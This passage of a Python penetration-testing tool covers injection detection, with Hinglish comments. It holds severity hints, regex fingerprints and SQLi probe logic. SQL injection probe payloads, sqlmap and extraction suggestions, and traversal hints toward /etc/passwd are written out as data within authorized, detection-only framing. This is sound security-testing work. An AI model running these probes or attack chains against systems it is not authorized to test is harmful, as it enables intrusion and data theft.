                             "Traversal encoder-variant ne WAF/blocker ke neeche read diya - "
                             "weak filtering (variant = proof)."),
    "open_redirect_confirmed": ("medium", 6.1,
                                "Open redirect confirmed (canary) - phishing + OAuth token-theft "
                                "chain (redirect_uri par mile to HIGH)."),
    "open_redirect_hint": ("low", 3.7,
                           "Redirect-param me canary reflect hua par server-side redirect "
                           "confirm nahi - client-side follow-up (P14)."),
    "client_redirect_canary": ("low", 3.3,
                               "JS/meta redirect me canary reflect - DOM-based open redirect "
                               "hint (P14 sink confirm karega)."),
    "crlf_header_injection": ("high", 6.4,
                              "Response-header injection (CRLF) - cache poisoning/session "
                              "fixation chains ka entry point."),
    "crlf_cookie_injection": ("medium", 5.8,
                              "CRLF se attacker-controlled Set-Cookie - session fixation hint."),
    "log_injection_hint": ("low", 3.1,
                           "Newline payloads log-ish reflect - log-injection/forge hypothesis "
                           "(server-side confirm manual)."),
    "hpp_anomaly": ("low", 3.1,
                    "Duplicate-param precedence anomaly - WAF-vs-backend param-parsing desync "
                    "hint (HPP bypass chains ka building block)."),
    "waf_detected": ("info", 0.0,
                     "WAF/block-layer fingerprint mila - stage M payloads isi ke neeche shape "
                     "hote hain."),
    "injection_blocked": ("info", 0.0,
                          "Probes WAF/validation ne block kiye - bug nahi; stage M encode "
                          "re-probe ka input."),
    "graphql_arg_injection": ("high", 8.6,
                              "GraphQL argument injection (quote/type confusion errors) - "
                              "schema introspection-adjacent leak; query-only tested."),
    "gql_error_disclosure": ("low", 3.4,
                             "GraphQL errors me schema/field suggestions leak (did-you-mean) - "
                             "hidden surface mapping."),
    "deser_hint": ("high", 9.0,
                   "Deserialization error fingerprint - framework identify hua. Gadget payload "
                   "KABHI nahi bheja gaya; manual/RoE-gated analysis chahiye."),
    "type_confusion_anomaly": ("medium", 5.4,
                               "Param type-flip (array/object) par anomalous behavior - weak "
                               "input validation hint."),
    "reflection_xss_ripe": ("info", 0.0,
                            "Param verbatim reflect hota hai (context mapped) - P13 XSS wave ka "
                            "ripest input; yahan payload-test P13 karega."),
    "injection_surface_sparse": ("info", 0.0,
                                 "Bahut kam injection targets mile - P5/P7/P8 pehle deeper chalao "
                                 "ya manual Burp mapping karo (runbook §10)."),
    "baseline_unstable": ("info", 0.0,
                          "Endpoint baseline unstable (double-fetch diff) - is target ke verdicts "
                          "NOISE mark hue; manual test karo."),
    # --- v13 stages ---
    "sqli_header": ("critical", 9.1,
                    "Header sink (X-Forwarded-For/Referer/UA) DB tak pahunch raha hai - internal "
                    "logging pipeline query banati hai; auth/log-poisoning chains possible."),
    "prototype_pollution": ("high", 8.2,
                            "Server-side prototype pollution - merged key echo confirm; gadget "
                            "chain (RCE/privilege-flip) P20/manual hypothesis, yahan sirf merge proof."),
    "xxe_entity_processing": ("high", 8.0,
                              "XML parser internal entities resolve kar raha hai - external-entity "
                              "firewall missing; file-read/SSRF variant P15 me RoE-gated manual."),
    "el_injection": ("critical", 9.0,
                     "Expression-Language arithmetic render - ${} evaluator live (SpEL/EL/Freemarker "
                     "family); RCE-class sink, proof arithmetic-tak hi (hard rule)."),
    "log4shell_indicator": ("critical", 9.8,
                            "JNDI lookup fingerprint loopback probe se confirm - Log4Shell-class "
                            "sink; RoE-gated stage (default OFF), patch/exclusion verify karo."),
    "log_injection_reflected": ("low", 3.1,
                                "Log payload verbatim echo - forged-log/alert-tampering vector; "
                                "jndi-guard missing ka indirect hint."),
    "csv_formula_injection": ("medium", 5.4,
                              "CSV cell me =formula unescaped reflect - victim spreadsheet open karne "
                              "par formula execution (stored chain, P13/P20 handoff)."),
}


def classify_severity(key):
    sev, cvss, why = SEVERITY_HINTS.get(key, ("info", 0.0, "Injection-surface signal."))
    return sev, cvss, why


# ---------------------------------------------------------------------------
# CHAIN HINTS (attack-chain documentation, reports/chains.txt me jaata hai)
# ---------------------------------------------------------------------------
CHAIN_HINTS = [
    {"when": "sqli_error|sqli_boolean|sqli_time",
     "then": "1) sqlmap --batch --level=2 (SIRF RoE written allow kare) ya manual "
             "sqlmap tamper scripts; 2) dump gate: RoE me dumps allowed nahi to "
             "detection-proof + DBMS/banner tak hi report; 3) union/error ke output "
             "se version() aur current_db tak bounded check (1-2 queries max).",
     "impact": "CRITICAL - auth bypass / full DB read chain"},
    {"when": "sqli_waf_bypassable",
     "then": "winning variant (proof me hai) ko sqlmap --tamper me map karo "
             "(doubleencode/charencode/space2comment); wahi variant manual Repeater "
             "me baseline payload ke aage lagaao.",
     "impact": "HIGH - WAF evasion + confirmed sink"},
    {"when": "nosql_injection",
     "then": "1) $regex char-by-char extraction SIRF apne test account par "
             "(bounded); 2) login par mila to RoE me 'auth bypass demo on own "
             "accounts' likho; 3) operator whitelist fix suggest karo.",
     "impact": "CRITICAL - auth bypass / data exposure"},
    {"when": "ssti_detected",
     "then": "1) engine identify (proof me engine tag hai); 2) RCE payload SIRF "
             "lab me; 3) production par arithmetic-proof + engine version tak hi; "
             "4) sandbox-escape note report me hypothesis ke roop me.",
     "impact": "CRITICAL - RCE chain (lab-only exploitation)"},
    {"when": "cmdi_detected|cmdi_blind_time",
     "then": "1) which OS (uname variants SIRF RoE allow kare); 2) reverse shell "
             "KABHI nahi (RoE); 3) blind case me exfil-bandwidth probes nahi - "
             "timing proof kaafi hai; 4) fix: allowlist + shell=False.",
     "impact": "CRITICAL - RCE"},
    {"when": "path_traversal_confirmed|traversal_waf_bypass",
     "then": "1) config/creds paths try karo SIRF read-only (/etc/passwd ke baad "
             "app config se secrets na NIKALO - file names tak hi); 2) winning "
             "encoder chain report me; 3) LFI-to-RCE (log poisoning/session file) "
             "sirf hypothesis likho, execute nahi.",
     "impact": "CRITICAL - arbitrary file read"},
    {"when": "open_redirect_confirmed",
     "then": "1) OAuth/OIDC flows ka redirect_uri param same variant se test karo "
             "(P21) - code/token theft chain; 2) header-based redirect vs JS "
             "redirect distinguish (proof me hai); 3) phishing demo screenshot "
             "canary domain tak hi.",
     "impact": "MEDIUM -> HIGH (OAuth chain)"},
    {"when": "crlf_header_injection",
     "then": "1) cache-poisoning chain (P26 cache layer matrix ke saath); "
             "2) session-fixation via injected Set-Cookie (apne accounts); "
             "3) response-splitting PRODUCTION PAR KABHI demo nahi - header "
             "injection proof kaafi hai.",
     "impact": "HIGH - cache/session chains"},
    {"when": "hpp_anomaly",
     "then": "1) same param ko WAF-facing aur backend-facing value ke saath bhejo "
             "(A,B / B,A) - access-control bypass (P11 matrix targets par); "
             "2) rate-limit bypass (param duplication se quota split) hint.",
     "impact": "MEDIUM - desync chains"},
    {"when": "reflection_xss_ripe",
     "then": "P13 XSS wave isi param/context par start karo (context table "
             "reflection_map.json me hai) - blind scan mat karo.",
     "impact": "HIGH - XSS wave seed list"},
    {"when": "el_injection|log4shell_indicator",
     "then": "1) engine version pin karo (proof me engine tag); 2) RCE exploit SIRF "
             "lab me - production par arithmetic/JNDI-loopback proof tak hi; 3) "
             "log4shell me patch matrix (2.15+/2.17+ per branch) + flag check report karo.",
     "impact": "CRITICAL - RCE-class sink (lab-only exploitation)"},
    {"when": "prototype_pollution|xxe_entity_processing|csv_formula_injection",
     "then": "1) PP: client-side gadget hunt P13 handoff use karo (waspPP key reflect "
             "hota hai); 2) XXE: external entity probe P15 me sirf RoE-written allow "
             "par; 3) CSV: stored vector - apne test row me payload daal ke export "
             "download karo (victim-side simulation).",
     "impact": "HIGH - chain-dependent escalation"},
]


# ===========================================================================
# FINDINGS + REDACTION + PURE HELPERS (unit-testable, koi network nahi)
# ===========================================================================
_PII_EMAIL = re.compile(r"(?i)\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z]{2,}\b")
_PII_JWT = re.compile(r"\beyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{0,}")
_PII_PHONE = re.compile(r"(?<![\d])\+?\d[\d \-]{8,14}\d(?![\d])")


def pii_redact(s, limit=420):
    """Evidence/detail text se PII mask karo (framework rule: redacted evidence)."""
    s = _PII_JWT.sub("eyJ***REDACTED***", s or "")
    s = _PII_EMAIL.sub(lambda m: m.group(0)[:2] + "***@***", s)
    s = _PII_PHONE.sub("***PHONE***", s)
    return truncate(s, limit)


class Findings:
    def __init__(self):
        self.items = []

    def add(self, key, title, endpoint, detail, evidence_ref="", extra=None):
        sev, cvss, why = classify_severity(key)
        rec = {"id": "INJ-%03d" % (len(self.items) + 1), "key": key, "title": title,
               "severity": sev, "cvss_hint": cvss, "endpoint": endpoint,
               "detail": pii_redact(detail), "why_it_matters": why,
               "evidence": evidence_ref, "ts": now_iso()}
        if extra:
            rec.update(extra)
        self.items.append(rec)
        return rec


def _compile_families(families):
    return [(name, [re.compile(rx, re.I) for rx in rxes]) for name, rxes in families]


_SQL_FAMILIES = _compile_families(SQL_ERROR_FAMILIES)
_SQL_GLOBAL = [re.compile(rx, re.I) for rx in SQL_GLOBAL_SIGS]
_NOSQL_SIGS = [re.compile(rx, re.I) for rx in NOSQL_ERROR_SIGS]
_CMDI_SIGS = [re.compile(rx) for rx in CMDI_FINGERPRINTS]
_TRAV_MARKERS = [(re.compile(rx), tag) for rx, tag in TRAVERSAL_MARKERS]
_DESER_SIGS = [(re.compile(rx, re.I), tag) for rx, tag in DESER_FINGERPRINTS]
_WAF_SIGS = [(re.compile(rx, re.I), tag) for rx, tag in WAF_BLOCK_SIGS]


def match_sql_error(text):
    """Response text -> (db_family, snippet) ya (None, '').
    Order: specific families pehle, phir global sigs (family='unknown-sql')."""
    for fam, rxes in _SQL_FAMILIES:
        for rx in rxes:
            m = rx.search(text)
            if m:
                return fam, truncate(m.group(0), 160)
    for rx in _SQL_GLOBAL:
        m = rx.search(text)
        if m:
            return "unknown-sql", truncate(m.group(0), 160)
    return None, ""


def match_nosql_error(text):
    for rx in _NOSQL_SIGS:
        m = rx.search(text)
        if m:
            return True, truncate(m.group(0), 160)
    return False, ""


def match_cmdi(text):
    for rx in _CMDI_SIGS:
        m = rx.search(text)
        if m:
            return True, truncate(m.group(0), 160)
    return False, ""


def match_traversal_marker(text):
    for rx, tag in _TRAV_MARKERS:
        m = rx.search(text)
        if m:
            return tag, truncate(m.group(0), 120)
    return None, ""


def match_deser(text):
    for rx, tag in _DESER_SIGS:
        m = rx.search(text)
        if m:
            return tag, truncate(m.group(0), 160)
    return None, ""


def match_waf_block(r, base=None):
    """Resp -> (waf_tag|None, snippet). Status + body-signature combined."""
    if r is None or r.error:
        return None, ""
    st = r.status or 0
    text = r.text[:3000]
    for rx, tag in _WAF_SIGS:
        m = rx.search(text)
        if m:
            return tag, truncate(m.group(0), 140)
    if st in WAF_STATUS_BLOCK and base:
        # 403-jo-baseline-403-jaisa-na-ho = block layer (soft-404 style guard)
        if len(r.body) and abs(len(r.body) - base.get("len", 0)) > 64:
            return "status-block", "%d len=%d" % (st, len(r.body))
        if st == 406:
            return "status-block", "406"
    if st == 406:
        return "status-block", "406"
    return None, ""


def param_family(name):
    """Param name -> family set (ek param multiple classes me ho sakta hai)."""
    n = (name or "").lower()
    fam = set()
    for hint in SQLI_PARAM_HINTS:
        if n == hint or n.endswith("_" + hint) or n == hint + "_id":
            fam.add("sqli")
            break
    for hint in SSTI_PARAM_HINTS:
        if n == hint:
            fam.add("ssti")
            break
    for hint in CMDI_PARAM_HINTS:
        if n == hint:
            fam.add("cmdi")
            break
    for hint in FILE_PARAM_HINTS:
        if n == hint:
            fam.add("file")
            break
    for hint in REDIRECT_PARAM_HINTS:
        if n == hint:
            fam.add("redirect")
            break
    if n in ("email", "user", "username", "acct", "account", "login", "auth",
             "token", "key", "session", "bearer") or "login" in n or "auth" in n:
        fam.add("nosql")
    if n in ("sort", "order", "filter", "q", "search", "query", "limit", "offset"):
        fam.add("sqli")
    if not fam:
        # unknown params ko default hunting order do (sab stages khud decide)
        fam.update(("sqli", "ssti", "file"))
    return fam


def _split_url(url):
    sp = urllib.parse.urlsplit(url)
    qs = urllib.parse.parse_qsl(sp.query, keep_blank_values=True)
    return sp, qs


def set_param(url, name, value):
    """URL me ?name= replace (agar hai) warna append. Query order preserve."""
    sp, qs = _split_url(url)
    new_q = []
    replaced = False
    for k, v in qs:
        if k == name and not replaced:
            new_q.append((k, value))
            replaced = True
        else:
            new_q.append((k, v))
    if not replaced:
        new_q.append((name, value))
    enc = urllib.parse.urlencode(new_q)
    return urllib.parse.urlunsplit((sp.scheme, sp.netloc, sp.path, enc, sp.fragment))


def get_param_value(url, name):
    sp, qs = _split_url(url)
    for k, v in qs:
        if k == name:
            return v
    return ""


def dup_param(url, name, extra_value):
    """HPP: name=orig&name=extra append (order A,B)."""
    sp, qs = _split_url(url)
    new_q = [(k, v) for k, v in qs] + [(name, extra_value)]
    enc = urllib.parse.urlencode(new_q)
    return urllib.parse.urlunsplit((sp.scheme, sp.netloc, sp.path, enc, sp.fragment))


def body_sim(a, b):
    if not a and not b:
        return 1.0
    if not a or not b:
        return 0.0
    return difflib.SequenceMatcher(None, a[:6000], b[:6000]).ratio()


def sig_of(r):
    """(status, body_len) quick signature."""
    return (r.status, len(r.body)) if r is not None and not r.error else (None, 0)


def differs(r, base, sim_threshold=0.985):
    """Resp baseline se truly different hai? (status ya len ya body-sim)."""
    if r is None or r.error:
        return False
    if r.status != base.get("status"):
        return True
    ln = len(r.body)
    tol = max(24, int(0.02 * max(1, base.get("len", 0))))
    if abs(ln - base.get("len", 0)) > tol:
        return True
    if body_sim(r.text, base.get("text_sample", "")) < sim_threshold:
        return True
    return False


def pair_diff(rt, rf, base, sim_threshold=0.985):
    """Boolean pair verdict: TRUE ~ baseline AND FALSE differs.
    Returns (verdict, reason):
      CONFIRMED  -> classic paired-diff hit
      SUSPECTED  -> dono differ par different ways (partial)
      NOISE      -> TRUE bhi baseline se bahar (unstable)
      SAFE       -> dono baseline-jaise"""
    if rt is None or rf is None or rt.error or rf.error:
        return "SAFE", "request-failed"
    t_diff = differs(rt, base, sim_threshold)
    f_diff = differs(rf, base, sim_threshold)
    if not t_diff and f_diff:
        return "CONFIRMED", "true~baseline AND false-differs (paired oracle)"
    if t_diff and f_diff and not body_sim(rt.text, rf.text[:6000] if rf else "") > 0.995:
        return "SUSPECTED", "dono differ (alag-alag ways) - manual verify"
    if t_diff:
        return "NOISE", "true-payload bhi baseline se bahar (unstable endpoint)"
    return "SAFE", "no differential"


def timing_hit(elapsed, base_med, threshold):
    """Baseline-relative timing verdict (network jitter guard)."""
    return elapsed is not None and base_med is not None and \
        (elapsed - base_med) >= max(threshold, 1.5)


def looks_blocking(st_text_pairs):
    """(resp, base) pairs me se koi WAF-block jaisa? -> (tag, snippet)."""
    for r, base in st_text_pairs:
        tag, snip = match_waf_block(r, base)
        if tag:
            return tag, snip
    return None, ""


def capture(ctx, url, param, payload, r, note=""):
    """FIX-1: shared capture store - reflection map (stage P) isi se banta hai."""
    if r is None or r.error:
        return
    ctx.setdefault("captures", [])
    if len(ctx["captures"]) >= 900:
        return
    ctx["captures"].append({
        "url": url, "param": param, "payload": payload, "status": r.status,
        "len": len(r.body), "text": r.text[:3000],
        "loc": r.header("Location", ""), "note": note,
    })


def mark_confirmed(ctx, url, param, klass):
    """One-confirm-per-param rule: confirmed (url,param) dobara probe nahi hota."""
    key = (template_key_of(url), param, klass)
    ctx.setdefault("confirmed", set()).add(key)


def is_confirmed(ctx, url, param, klass):
    return (template_key_of(url), param, klass) in ctx.get("confirmed", ())


def template_key_of(url):
    sp, _ = _split_url(url)
    return "%s %s" % ("GET", sp.path)


# ---------------------------------------------------------------------------
# REFLECTION CONTEXT CLASSIFIER (stage P core, pure)
# ---------------------------------------------------------------------------
_CONTEXT_RULES = [
    ("js-string", re.compile(r"['\"][^'\"]{0,80}%s['\"]")),
    ("html-attr", re.compile(r"<[^>]+\w=['\"][^'\"]{0,120}%s")),
    ("inside-tag", re.compile(r"<[^>]{0,200}%s[^>]{0,200}>")),
    ("html-body", re.compile(r">[^<>]{0,120}%s[^<>]{0,120}<")),
    ("header", re.compile(r"(?m)^[\w-]+:\s.*%s")),
]


def reflection_context(text, marker):
    """marker text kahan reflect hua? -> (context|None, verbatim: bool)."""
    if not marker or marker.lower() not in text.lower():
        # encoded reflect?
        enc = urllib.parse.quote(marker, safe="")
        if enc and enc in text:
            return ("encoded", False)
        enc2 = marker.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
        if enc2 in text:
            return ("html-encoded", False)
        enc3 = marker.replace("'", "&#x27;").replace('"', "&quot;")
        if enc3 in text:
            return ("html-encoded", False)
        return None, False
    i = text.lower().find(marker.lower())
    window = text[max(0, i - 220):i + len(marker) + 220]
    esc = re.escape(marker)
    for name, rx in _CONTEXT_RULES:
        if re.search(rx.pattern % esc, window, re.I):
            return (name, True)
    return ("html-body", True)


# ===========================================================================
# STAGE A: INJECTION SURFACE DISCOVERY (P1-P11 mining, evidence-ranked)
# ===========================================================================
def _is_noise_path(url):
    path = urllib.parse.urlsplit(url).path.lower()
    return bool(re.search(r"\.(css|js|png|jpe?g|gif|svg|ico|woff2?|ttf|mp4|webp)(\?|$)", path)) \
        or bool(re.search(r"(?i)(^|/)(static|assets|cdn|fonts|images|img)(/|$)", path))


def _mine_phase8_queue(base_dir, eng, scope):
    """P8 priority_queue.json -> injection-class items."""
    out = []
    for q in (os.path.join(base_dir, "surface", "priority_queue.json"),
              os.path.join(eng, "surface", "priority_queue.json")):
        d = load_json(q, None)
        if not isinstance(d, dict):
            continue
        for item in (d.get("queue") or []):
            t = item.get("target") or ""
            classes = " ".join(str(c) for c in (item.get("classes") or []))
            if not t:
                continue
            out.append({"url": t, "priority": float(item.get("priority") or 10),
                        "source": "P8-queue",
                        "boost": 2.0 if re.search(r"(?i)inject|param|input", classes) else 0.5})
    return out


def _mine_param_files(base_dir, eng, scope):
    """P5/P7 param inventories -> (url,param) pairs."""
    out = []
    seen = set()

    def add_param_urls(txt_path, source, boost):
        if not os.path.exists(txt_path):
            return
        for line in open(txt_path, errors="ignore"):
            u = line.strip().split()[0] if line.strip() else ""
            if not u.startswith("http"):
                continue
            sp, qs = _split_url(u)
            for k, _v in qs:
                key = (u.split("?")[0], k)
                if key in seen:
                    continue
                seen.add(key)
                out.append({"url": u, "param": k, "priority": 8.0,
                            "source": source, "boost": boost})

    for d in (base_dir, eng):
        add_param_urls(os.path.join(d, "passive", "findings", "param_names.txt"), "P5-params", 1.0)
        add_param_urls(os.path.join(d, "passive", "findings", "sensitive_params.txt"), "P5-sensitive", 1.5)
        add_param_urls(os.path.join(d, "content", "all_found.txt"), "P5-content", 1.0)
        add_param_urls(os.path.join(d, "content", "api_endpoints.txt"), "P5-api", 1.2)
        add_param_urls(os.path.join(d, "js", "endpoints.txt"), "P7-js", 1.0)
        add_param_urls(os.path.join(d, "js", "params.txt"), "P7-params", 1.2)
    return out


def _mine_behavior_evidence(base_dir, eng, scope):
    """P6 http_behavior.json + error_signatures + P4 error_templates -> boosts."""
    out = []
    for d in (base_dir, eng):
        hb = load_json(os.path.join(d, "tech", "http_behavior.json"), None)
        if isinstance(hb, dict):
            for rec in (hb.get("behaviors") or hb.get("params") or []):
                if isinstance(rec, dict) and rec.get("url") and rec.get("param"):
                    out.append({"url": rec["url"], "param": rec.get("param"),
                                "priority": 7.0, "source": "P6-behavior", "boost": 2.0,
                                "note": str(rec.get("note") or "")[:120]})
        # error_signatures.txt: lines "URL | sig" ya "path sig" format (tolerant)
        es = os.path.join(d, "tech", "error_signatures.txt")
        if os.path.exists(es):
            for line in open(es, errors="ignore"):
                if "|" not in line:
                    continue
                u = line.split("|")[0].strip()
                if u.startswith("http") and "?" in u:
                    sp, qs = _split_url(u)
                    for k, _v in qs[:2]:
                        out.append({"url": u, "param": k, "priority": 6.5,
                                    "source": "P6-error-sig", "boost": 1.8})
        et = os.path.join(d, "active", "error_templates.txt")
        if os.path.exists(et):
            for line in open(et, errors="ignore"):
                u = line.strip().split()[0] if line.strip() else ""
                if u.startswith("http") and "?" in u:
                    sp, qs = _split_url(u)
                    for k, _v in qs[:2]:
                        out.append({"url": u, "param": k, "priority": 6.0,
                                    "source": "P4-error-template", "boost": 1.5})
    return out


def _mine_auth_evidence(base_dir, eng, scope):
    """P9 injection_oracle.json + auth_redirect_xss.json -> direct evidence."""
    out = []
    for d in (base_dir, eng):
        io = load_json(os.path.join(d, "auth", "injection_oracle.json"), None)
        if isinstance(io, dict):
            for rec in (io.get("endpoints") or io.get("oracle") or []):
                if isinstance(rec, dict) and rec.get("url"):
                    out.append({"url": rec["url"], "param": rec.get("param") or "",
                                "priority": 9.0, "source": "P9-injection-oracle",
                                "boost": 3.0,
                                "note": str(rec.get("note") or rec.get("hint") or "")[:120]})
        rx = load_json(os.path.join(d, "auth", "auth_redirect_xss.json"), None)
        if isinstance(rx, dict):
            for rec in (rx.get("reflections") or rx.get("reflected") or rx.get("endpoints") or []):
                if isinstance(rec, dict) and (rec.get("url") or rec.get("param")):
                    out.append({"url": rec.get("url") or "", "param": rec.get("param") or "",
                                "priority": 9.0, "source": "P9-reflection", "boost": 3.0,
                                "note": "already-reflected input (XSS/Injection ripe)"})
    return out


def _mine_redirect_assets(base_dir, eng, scope):
    """P7 client_redirects + P2 forms → redirect-family seeds."""
    out = []
    for d in (base_dir, eng):
        cr = load_json(os.path.join(d, "js", "js_analysis.json"), None)
        if isinstance(cr, dict):
            for rec in (cr.get("client_redirects") or []):
                u = rec.get("url") if isinstance(rec, dict) else None
                if u:
                    out.append({"url": u, "param": rec.get("param") or "next",
                                "priority": 7.5, "source": "P7-client-redirect",
                                "boost": 2.2, "family": "redirect"})
    return out


def _mine_p11_feedforward(base_dir, eng, scope):
    """P11 feedforward.json (to_phase12/13/14 keys, tolerant) -> boosts."""
    out = []
    for d in (base_dir, eng):
        ff = load_json(os.path.join(d, "access", "feedforward.json"), None)
        if not isinstance(ff, dict):
            continue
        mapping = ff.get("mapping") if isinstance(ff.get("mapping"), dict) else ff
        for k, v in mapping.items():
            if not isinstance(v, dict):
                continue
            if "12" in k or "inject" in k.lower():
                for rec in (v.get("inject_candidates") or v.get("targets") or v.get("endpoints") or []):
                    u = rec.get("url") if isinstance(rec, dict) else str(rec)
                    if u:
                        out.append({"url": u, "param": (rec.get("param") if isinstance(rec, dict) else "") or "",
                                    "priority": 8.5, "source": "P11-feedforward", "boost": 2.5})
            if "13" in k or "14" in k:
                for rec in (v.get("xss_ripe") or v.get("reflected") or []):
                    u = rec.get("url") if isinstance(rec, dict) else str(rec)
                    if u:
                        out.append({"url": u, "param": (rec.get("param") if isinstance(rec, dict) else "") or "",
                                    "priority": 8.0, "source": "P11-XSS-ripe", "boost": 2.0})
    return out


def _hint_targets_from_params(base_dir, scope):
    """Scope seeds + hint params: kam-e-kam kuch targets to milein (cold start)."""
    out = []
    for seed in scope.seed_urls():
        for p in ("q", "search", "id", "page", "file", "next", "redirect", "url"):
            out.append({"url": set_param(seed, p, "1"), "param": p, "priority": 3.0,
                        "source": "hint-seed", "boost": 0.5})
    return out


def discover_inject_surface(base_dir, scope, conf):
    """Evidence-ranked injection targets -> (ranked, meta) JSON-serializable."""
    eng_root = os.path.join(base_dir, scope.engagement)   # base/<engagement>/<phase>/ files
    recs = []
    recs += _mine_phase8_queue(base_dir, eng_root, scope)
    recs += _mine_param_files(base_dir, eng_root, scope)
    recs += _mine_behavior_evidence(base_dir, eng_root, scope)
    recs += _mine_auth_evidence(base_dir, eng_root, scope)
    recs += _mine_redirect_assets(base_dir, eng_root, scope)
    recs += _mine_p11_feedforward(base_dir, eng_root, scope)

    # scope filter + noise filter + normalize
    pool = {}
    for rec in recs:
        u = rec.get("url") or ""
        if not u or not u.startswith("http"):
            continue
        u = u.split("#")[0]
        try:
            if not scope.check_url(u, raise_on_fail=False):
                continue
        except Exception:
            continue
        if _is_noise_path(u):
            continue
        param = rec.get("param") or ""
        if not param:
            sp, qs = _split_url(u)
            if not qs:
                continue
            param = qs[0][0]
        key = (u.split("?")[0], param)
        score = rec.get("boost", 1.0) + (rec.get("priority", 5.0) / 10.0)
        fam = param_family(param)
        fams = rec.get("family")
        if fams:
            fam &= {fams} if isinstance(fams, str) else set(fams)
        cur = pool.get(key)
        if cur is None:
            pool[key] = {"url": u, "param": param, "evidence": score,
                         "sources": [rec["source"]], "families": sorted(fam),
                         "note": rec.get("note", "")}
        else:
            cur["evidence"] += score * 0.35
            if rec["source"] not in cur["sources"]:
                cur["sources"].append(rec["source"])
            for f in fam:
                if f not in cur["families"]:
                    cur["families"].append(f)

    ranked = sorted(pool.values(), key=lambda r: -r["evidence"])
    if not ranked:
        # cold start: hint-seed targets (sirf scope seeds se)
        for rec in _hint_targets_from_params(base_dir, scope):
            if scope.check_url(rec["url"], raise_on_fail=False):
                ranked.append(rec)

    ranked = ranked[:int(conf.get("inject_param_cap", 40))]
    for i, r in enumerate(ranked):
        r["rank"] = i + 1
    meta = {"total_mined": len(recs), "unique_targets": len(pool),
            "after_cap": len(ranked)}
    return ranked, meta


# ===========================================================================
# STAGE B: BASELINE & CALIBRATION
# ===========================================================================
def _req(http, method, url, **kw):
    """Scope-safe request wrapper: ScopeError/TypeError -> None."""
    try:
        return http.request(method, url, **kw)
    except ScopeError:
        return None
    except TypeError:
        kw.pop("read_only_post", None)
        try:
            return http.request(method, url, **kw)
        except Exception:
            return None
    except Exception:
        return None


def baseline_endpoint(http, url, conf, cp, tag="base"):
    """2x GET baseline + timing stats. Returns dict (JSON-serializable)."""
    ck = "baseline:%s:%s" % (tag, url)
    if cp.is_done(ck):
        return cp.result_of(ck) or {}
    samples = []
    for _i in range(2):
        r = _req(http, "GET", url, allow_redirects=False)
        if r is None or r.error:
            continue
        samples.append(r)
    if not samples:
        res = {"ok": False, "url": url}
        cp.mark(ck, res, summary="baseline-fail")
        return res
    lens = [len(s.body) for s in samples]
    elap = [s.elapsed for s in samples]
    tol = max(24, int(0.02 * max(1, median(lens))))
    res = {
        "ok": True, "url": url,
        "status": samples[0].status,
        "len": median(lens),
        "len_tol": tol,
        "sha1": samples[0].sha1(),
        "text_sample": samples[0].text[:4000],
        "elapsed_med": median(elap) if elap else 0.0,
        "elapsed_mad": (max(elap) - min(elap)) if len(elap) > 1 else 0.0,
        "stable": (len(set(lens)) == 1) or (max(lens) - min(lens) <= tol and
                    body_sim(samples[0].text, samples[1].text) >= 0.995),
        "redirect_loc": samples[0].header("Location", ""),
    }
    cp.mark(ck, res, summary="baseline")
    return res


def soft404_for_origin(http, url, conf, cp):
    """Origin-shared soft-404 baseline (cheap: 2 samples)."""
    origin = "{0.scheme}://{0.netloc}".format(urllib.parse.urlsplit(url))
    ck = "soft404:%s" % origin
    if cp.is_done(ck):
        return cp.result_of(ck) or {}
    base = soft404_baseline(http, origin, samples=2)
    cp.mark(ck, base or {}, summary="soft404")
    return base or {}


def waf_detect(http, url, param, conf, cp, meta):
    """1 noisy-but-harmless probe se WAF fingerprint (per-endpoint cached).
    Block ho ya na ho - ye finding nahi, sirf calibration."""
    ck = "waf:%s:%s" % (url.split("?")[0], param)
    if cp.is_done(ck):
        return cp.result_of(ck) or {}
    if not conf.get("inject_waf_probe_budget", 0) or \
            meta.get("waf_probes_used", 0) >= int(conf.get("inject_waf_probe_budget", 6)):
        return {}
    base = baseline_endpoint(http, url, conf, cp, tag="waf")
    if not base.get("ok"):
        return {}
    meta["waf_probes_used"] = meta.get("waf_probes_used", 0) + 1
    probe_url = set_param(url, param, "1 UNION ALL SELECT NULL,wasp--")
    r = _req(http, "GET", probe_url, allow_redirects=False)
    tag, snip = match_waf_block(r, base)
    res = {"url": url, "param": param, "waf": tag,
           "snippet": snip, "probe_status": (r.status if r and not r.error else None)}
    cp.mark(ck, res, summary="waf-map")
    return res


# ===========================================================================
# STAGE C/D/E: SQLi ENGINES (error / boolean / time) - detection-only
# ===========================================================================
ERROR_QUOTES = ["'", '"', "`", "\\", "1'", "'1"]


def error_sqli(http, scope, F, ctx, conf, targets, meta, cp):
    """Stage C: quote-variant probes x DB-error fingerprints."""
    ck = "stageC:error-sqli"
    if cp.is_done(ck):
        cached = cp.result_of(ck) or {"records": [], "stats": {}}
        error_sqli_findings(F, cached)
        ok("Stage C replayed (checkpoint): %d records" % len(cached.get("records", [])))
        return cached
    budget = int(conf.get("inject_error_probes", 24))
    spent = 0
    records = []
    sql_targets = [t for t in targets
                   if "sqli" in (t.get("families") or [])] or list(targets)[:12]
    for t in sql_targets:
        if spent >= budget:
            break
        url, param = t["url"], t["param"]
        if is_confirmed(ctx, url, param, "sqli"):
            continue
        base = baseline_endpoint(http, url, conf, cp, tag="c")
        if not base.get("ok"):
            continue
        orig = get_param_value(url, param)
        rec = {"url": url, "param": param, "verdict": "SAFE", "signals": [],
               "db": None, "snippet": ""}
        hit = None
        for q in ERROR_QUOTES:
            if spent >= budget:
                break
            payload = (orig + q) if orig else q
            r = _req(http, "GET", set_param(url, param, payload), allow_redirects=False)
            spent += 1
            if r is None or r.error:
                continue
            capture(ctx, url, param, payload, r, note="sqli-error")
            fam, snip = match_sql_error(r.text)
            if fam:
                base_fam, _ = match_sql_error(base.get("text_sample", ""))
                if base_fam:
                    rec["signals"].append({"note": "baseline me hi error text tha - noise"})
                    break
                waf_tag, _ = match_waf_block(r, base)
                if waf_tag:
                    rec["verdict"] = "WAF_BLOCKED"
                    rec["signals"].append({"waf": waf_tag})
                    break
                rec["verdict"] = "CONFIRMED"
                rec["db"] = fam
                rec["snippet"] = snip
                rec["signals"].append({"payload": payload, "family": fam,
                                       "status": r.status, "len": len(r.body)})
                mark_confirmed(ctx, url, param, "sqli")
                hit = (fam, snip)
                break
            tag, _ = match_waf_block(r, base)
            if tag and not rec["signals"]:
                rec["verdict"] = "WAF_BLOCKED"
